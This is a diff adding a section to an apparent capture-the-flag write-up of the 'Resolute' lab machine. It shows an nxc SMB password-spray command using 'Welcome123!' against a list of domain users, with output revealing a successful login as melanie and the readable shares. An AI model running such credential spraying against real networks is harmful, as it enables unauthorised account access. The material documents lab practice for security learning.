@@ -177,3 +177,41 @@ Since null session authentication was accepted, I tried to enumerate users.
 This returned a list of domain users, and the description for the user `marko` indicated that the password was set to `Welcome123!`.
 
 ---
+```
+nxc smb 10.129.100.9 -u users.txt -p passwords.txt --shares 
+SMB         10.129.100.9    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
+SMB         10.129.100.9    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
+SMB         10.129.100.9    445    RESOLUTE         [*] Enumerated shares
+SMB         10.129.100.9    445    RESOLUTE         Share           Permissions     Remark
+SMB         10.129.100.9    445    RESOLUTE         -----           -----------     ------
+SMB         10.129.100.9    445    RESOLUTE         ADMIN$                          Remote Admin
+SMB         10.129.100.9    445    RESOLUTE         C$                              Default share
+SMB         10.129.100.9    445    RESOLUTE         IPC$            READ            Remote IPC
+SMB         10.129.100.9    445    RESOLUTE         NETLOGON        READ            Logon server share 
+SMB         10.129.100.9    445    RESOLUTE         SYSVOL          READ            Logon server share 
+```
+
+Using the enumerated usernames and the password `Welcome123!`, authentication as `melanie` succeeded and allowed enumeration of the available shares.
+
+---
+```
+```
